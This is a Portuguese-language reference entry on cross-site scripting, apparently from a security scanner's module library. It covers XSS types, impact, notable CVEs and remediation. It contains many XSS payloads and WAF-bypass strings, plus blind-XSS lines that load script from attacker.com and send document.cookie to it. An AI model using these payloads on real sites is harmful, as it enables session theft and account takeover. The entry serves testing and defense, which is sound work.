---
id: xss
title: "Cross-Site Scripting"
module: "xss"
severity: "CRITICAL"
cwe_id: "CWE-79"
cwe_title: "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
cvss_vector: "AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N"
vrt_id: "cross_site_scripting_xss.reflected_xss"
---

## Summary
Entrada do usuário é inserida sem codificação adequada em HTML, atributos, JavaScript ou URL, permitindo executar script no navegador da vítima e roubar sessão, tokens e dados.

## Description
XSS ocorre quando a aplicação reflete ou armazena dados controlados pelo atacante sem escape para o contexto correto. Tipos:

- **Refletido:** payload na requisição é devolvido na resposta (busca, erro, parâmetro de URL).
- **Armazenado:** payload persiste (comentário, perfil, nome de arquivo, ticket) e atinge outros usuários.
- **DOM-based:** sink inseguro no JavaScript (`innerHTML`, `document.write`, `eval`, `location`, `jQuery.html`) processa fonte controlável (`location.hash`, `postMessage`, `referrer`).
- **Blind XSS:** payload executa em painel administrativo/logs, sem reflexo visível ao atacante.

O contexto importa: HTML (`<div>...</div>`), atributo (`value="..."`), JavaScript (`var x='...'`), URL (`href="..."`), CSS e JSON. Cada contexto exige codificação diferente. CSP e `HttpOnly` reduzem impacto, mas não substituem output encoding.

## Impact
- Roubo de cookies de sessão (se não `HttpOnly`) e tokens em `localStorage`.
- Ações em nome da vítima, CSRF bypass e account takeover.
- Defacement, phishing e distribuição de malware.
- Exfiltração de dados e keylogging.
- XSS em painel admin pode levar a RCE via funcionalidades administrativas.
- Impacto CRITICAL em stored/admin; refletido pode ser MEDIUM/HIGH.

## Payloads and Bypasses
```html
<!-- HTML -->
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<body onload=alert(document.domain)>
<iframe srcdoc="<script>alert(1)</script>"></iframe>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>

<!-- Atributo -->
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
" autofocus onfocus=alert(1) x="
' onmouseover='alert(1)

<!-- JavaScript -->
'-alert(1)-'
';alert(1)//
\';alert(1)//
</script><script>alert(1)</script>
\u003cscript\u003ealert(1)\u003c/script\u003e

<!-- URL -->
javascript:alert(1)
javascript:alert(document.domain)
data:text/html,<script>alert(1)</script>
vbscript:msgbox(1)

<!-- DOM -->
#<img src=x onerror=alert(1)>
?x=<svg/onload=alert(1)>
{{constructor.constructor('alert(1)')()}}
```

WAF bypass:
```text
# Case e quebra de tags
<ScRiPt>alert(1)</sCrIpT>
<img src=x onerror=alert(1)>
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>

# Codificação
%3Cscript%3Ealert(1)%3C/script%3E
%253Cscript%253Ealert(1)%253C/script%253E
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
\u003cscript\u003ealert(1)\u003c/script\u003e

# Sem parênteses/espaços
<img src=x onerror=alert`1`>
<svg onload=alert&lpar;1&rpar;>
<script>alert(1)</script&#x3e;

# Alternativas
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
<form action="javascript:alert(1)"><input type=submit>

# Bypass de CSP com JSONP/angular/upload same-origin
<script src="/api/jsonp?callback=alert"></script>
```

Blind XSS:
```html
<script src="https://attacker.com/x.js"></script>
"><script src=//attacker.com/x.js></script>
<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
```

Casos reais e mentalidade de ataque (RWBH): Twitter (stored XSS em perfis/tweets), Yahoo (parâmetros de busca refletidos) e Uber (painéis de suporte) mostram que o contexto dita o payload; o atacante testa HTML, atributo, JavaScript, URL e DOM.

## Target Context (Crawler Hints)
- **Parâmetros comuns:** `q`, `s`, `search`, `query`, `name`, `message`, `comment`, `content`, `title`, `description`, `url`, `redirect`, `next`, `callback`, `lang`, `theme`, `error`, `file`, `email`.
- **Paths comuns:** `/search`, `/login`, `/profile`, `/comments`, `/messages`, `/upload`, `/error`, `/redirect`, `/api/*`, `/admin`, `/support`.
- **Sinais:** entrada refletida sem escape; `innerHTML`/`document.write`; `eval`; `postMessage` sem validação; CSP ausente ou permissiva; resposta com `text/html` para entrada do usuário.

## Notable CVEs

| CVE | Produto | Ano | Descricao | Tipo |
|-----|---------|-----|-----------|------|
| CVE-2020-11022 | jQuery 1.12.0 -- 3.5.0 | 2020 | HTML de fontes nao confiaveis passado para .html()/.append() pode executar XSS mesmo apos sanitizacao | DOM XSS |
| CVE-2020-11023 | jQuery 1.0.3 -- 3.5.0 | 2020 | Elementos option em HTML nao confiavel passado para metodos de manipulacao DOM causam XSS | DOM XSS |
| CVE-2021-41184 | jQuery UI < 1.13.0 | 2021 | Opcao `of` do .position() aceita input nao confiavel que executa codigo arbitrario | DOM XSS |
| CVE-2023-29489 | cPanel < 11.109.9999.116 | 2023 | XSS refletido na pagina de erro do cpsrvd via webcall ID invalido -- pre-auth, afeta milhoes de servidores | Reflected XSS |
| CVE-2024-4367 | Mozilla PDF.js (Firefox < 126) | 2024 | Type check ausente no handling de fontes em PDF.js permite execucao de JavaScript arbitrario no contexto do viewer | DOM XSS |
| CVE-2023-44389 | Zope | 2023 | Propriedade title de objetos Zope aceita script code que executa ao visualizar o objeto no Zope Management Interface | Stored XSS |
| CVE-2024-25600 | WordPress Bricks Builder <= 1.9.6 | 2024 | Code injection via builder permite RCE sem autenticacao -- vetor inicial via XSS em templates | Stored XSS / RCE |
| CVE-2022-29078 | EJS 3.1.6 (Node.js) | 2022 | Server-side template injection via settings[view options][outputFunctionName] permite execucao de codigo arbitrario | SSTI / XSS |
| CVE-2023-6553 | WordPress Backup Migration <= 1.3.7 | 2023 | RCE via /includes/backup-heart.php sem autenticacao -- frequentemente encadeado com XSS para persistence | RCE via injection |
| CVE-2022-35914 | GLPI <= 10.0.2 (htmlawed) | 2022 | PHP code injection via htmLawedTest.php exposto -- modulo de sanitizacao HTML exploitavel | Stored XSS / RCE |

**Fontes**: CVE List v5 (cvelistV5), NVD, advisories dos vendors.

## Recommendation
1. Codificar a saída conforme o contexto (HTML entity, attribute, JavaScript, URL, CSS) usando funções nativas do framework.
2. Nunca inserir entrada do usuário em `innerHTML`, `document.write`, `eval`, `Function`, `setTimeout(string)`; usar `textContent` e APIs seguras.
3. Aplicar CSP restritiva com nonce/hash e sem `unsafe-inline`/`unsafe-eval`.
4. Marcar cookies de sessão como `HttpOnly`, `Secure` e `SameSite=Lax/Strict`.
5. Validar e sanitizar HTML rico com biblioteca allowlist (DOMPurify, OWASP Java HTML Sanitizer); evitar regex caseira.
6. Usar frameworks com autoescape (React, Angular, Vue, Thymeleaf) e revisar `dangerouslySetInnerHTML`/`v-html`.
7. Sanitizar `postMessage` (validar `origin` e schema) e evitar sinks DOM.
8. Exemplo Java/Spring:
```java
// Thymeleaf escapa por padrão
<p th:text="${comment}">...</p>
// Nunca usar th:utext com entrada do usuário
```
9. Exemplo Node:
```js
const DOMPurify = require('dompurify');
const clean = DOMPurify.sanitize(userHtml, {ALLOWED_TAGS: ['b', 'i', 'p']});
```
10. Testar com payloads em todos os contextos e manter regressão no CI.
